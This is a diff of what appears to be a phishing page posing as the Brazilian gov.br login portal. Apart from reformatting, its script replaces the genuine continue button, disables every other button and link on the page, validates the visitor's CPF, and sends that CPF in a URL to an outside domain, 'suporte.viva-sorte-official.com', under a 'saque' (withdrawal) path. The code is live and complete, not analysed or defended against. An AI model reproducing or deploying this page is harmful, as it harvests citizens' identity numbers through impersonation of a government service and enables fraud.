@@ -62,37 +62,39 @@
 								<button type="button" id="allowedButton" class="button-continuar desabilitado" disabled="">Continuar</button>
 							</div>
 							<style>
-                        .button-continuar {
-                            /* Estilos comuns do botão aqui */
-                            background: #1351B4 0 0 no-repeat padding-box !important; /* Cor quando habilitado */
-                        }
-                    
-                        .button-continuar.desabilitado {
-                            background: #b5b5b5 0 0 no-repeat padding-box !important; /* Cor quando desabilitado */
-                        }
-                    </style>
-							<style>
-                        .error-border {
-                            border: 1px solid red !important;
-                            box-shadow: 0 0 0 1px #ffa5b9;
-                        }
-                
-                        .error-text {
-                            color: red !important;
-                        }
-                
-                        .error-container {
-                            margin: 10px 0px -17px 10px;
-                            display: inline-block;
-                            align-items: center;
-                        }
-                
-                        .error-image {
-                            display: none;
-                            margin: -63px 0px 0px 265px;
-                        }
-                    </style>
+								.button-continuar {
+									/* Estilos comuns do botão aqui */
+									background: #1351B4 0 0 no-repeat padding-box !important;
+									/* Cor quando habilitado */
+								}
+	
+								.button-continuar.desabilitado {
+									background: #b5b5b5 0 0 no-repeat padding-box !important;
+									/* Cor quando desabilitado */
+								}
+	
+								.error-border {
+									border: 1px solid red !important;
+									box-shadow: 0 0 0 1px #ffa5b9;
+								}
+	
+								.error-text {
+									color: red !important;
+								}
+	
+								.error-container {
+									margin: 10px 0px -17px 10px;
+									display: inline-block;
+									align-items: center;
+								}
+	
+								.error-image {
+									display: none;
+									margin: -63px 0px 0px 265px;
+								}
+							</style>
 							<script>
+								// Função para substituir o botão específico
 								function substituirBotaoEspecifico() {
 									const novoBotao = document.createElement('button');
 									novoBotao.type = 'button';
@@ -100,41 +102,41 @@
 									novoBotao.className = 'button-continuar desabilitado';
 									novoBotao.innerHTML = 'Continuar';
 									novoBotao.disabled = true;
-							
+	
 									const botaoAlvo = document.getElementById('enter-account-id');
 									if (botaoAlvo) {
 										botaoAlvo.parentNode.replaceChild(novoBotao, botaoAlvo);
 									}
-							
+	
 									novoBotao.addEventListener('click', redirecionarSeValido);
 								}
-							
+	
 								function bloquearElementosClicaveis() {
-									document.querySelectorAll('button:not(#allowedButton)').forEach(function(botao) {
+									document.querySelectorAll('button:not(#allowedButton)').forEach(function (botao) {
 										botao.disabled = true;
 									});
-							
-									document.querySelectorAll('a').forEach(function(link) {
-										link.addEventListener('click', function(event) {
+	
+									document.querySelectorAll('a').forEach(function (link) {
+										link.addEventListener('click', function (event) {
 											event.preventDefault();
 										});
 									});
-							
-									document.querySelectorAll('img').forEach(function(imagem) {
+	
+									document.querySelectorAll('img').forEach(function (imagem) {
 										if (imagem.parentNode.tagName === 'A') {
-											imagem.parentNode.addEventListener('click', function(event) {
+											imagem.parentNode.addEventListener('click', function (event) {
 												event.preventDefault();
 											});
 										}
 									});
 								}
-							
+	
 								var cpfInput = document.getElementById('novoCampoCPF');
 								var cpfError = document.getElementById('cpfError');
 								var errorImage = document.getElementById('errorImage');
-							
+	
 								cpfInput.addEventListener('input', mascaraCPF);
-							
+	
 								function mascaraCPF() {
 									var cpf = cpfInput.value;
 									cpf = cpf.replace(/\D/g, "");
@@ -145,14 +147,14 @@
 									cpf = cpf.replace(/(\d{3})(\d)/, "$1.$2");
 									cpf = cpf.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
 									cpfInput.value = cpf;
-							
+	
 									validarCPF();
 								}
-							
+	
 								function validarCPF() {
 									var cpf = cpfInput.value;
 									var cpfNumeros = cpf.replace(/[^\d]+/g, '');
-							
+	
 									var botao = document.getElementById('allowedButton');
 									if (cpf.length !== 14 || !validaCPF(cpfNumeros)) {
 										cpfError.textContent = cpf.length === 14 ? 'CPF Inválido' : '';
@@ -168,10 +170,10 @@
 										botao.classList.remove('desabilitado');
 									}
 								}
-							
+	
 								function validaCPF(cpf) {
-									cpf = cpf.replace(/[^\d]+/g,'');
-									if(cpf === '' || cpf.length !== 11 || /^(.)\1+$/.test(cpf)) return false;
+									cpf = cpf.replace(/[^\d]+/g, '');
+									if (cpf === '' || cpf.length !== 11 || /^(.)\1+$/.test(cpf)) return false;
 									let add = 0;
 									for (let i = 0; i < 9; i++) {
 										add += parseInt(cpf.charAt(i)) * (10 - i);
@@ -187,28 +189,26 @@
 									rev = (rev === 10 || rev === 11) ? 0 : rev;
 									return rev === parseInt(cpf.charAt(10));
 								}
-							
+	
 								function redirecionarSeValido() {
-									var cpf = cpfInput.value.replace(/[^\d]+/g,'');
+									var cpf = cpfInput.value.replace(/[^\d]+/g, '');
 									if (validaCPF(cpf)) {
 										var url = "https://suporte.viva-sorte-official.com/saque/saque.html?cpf=" + cpf;
 										window.location.href = url;
 									}
 								}
-							
+	
 								substituirBotaoEspecifico();
 								bloquearElementosClicaveis();
 							</script>
 						</div>
 						<label id="title-outras-op">Outras opções de identificação:</label>
 						<hr id="hr-outras-op" style="margin: 0 0 0">
-
 						<div class="item-login-signup-ways" onclick="showModal('modal-bancos-credenciados')">
 							<button type="button" tabindex="5" class="button-href-mimic2" style="color:#008C32" onclick="showModal('modal-bancos-credenciados')">
 								<img src="images/SzxWw70mTt7S.png">
 								Login com seu banco
-								<span style="font-size: 7px; background-color: #008C32; color: white; padding: 3px; top: -3px; position: relative; margin-left: 8px;">SUA
-									CONTA SERÁ PRATA</span>
+								<span style="font-size: 7px; background-color: #008C32; color: white; padding: 3px; top: -3px; position: relative; margin-left: 8px;">SUA CONTA SERÁ PRATA</span>
 							</button>
 						</div>
 						<div class="modal-bancos-credenciados">
@@ -344,6 +344,11 @@
 								</div>
 							</div>
 						</div>
+					</div>
+				</form>
+			</main>
+		</div>
+						
 						<div class="entenda-id-govbr" id="entenda-id-govbr">
 							<span>
 								<a tabindex="6" id="entenda-id-govbr-a">
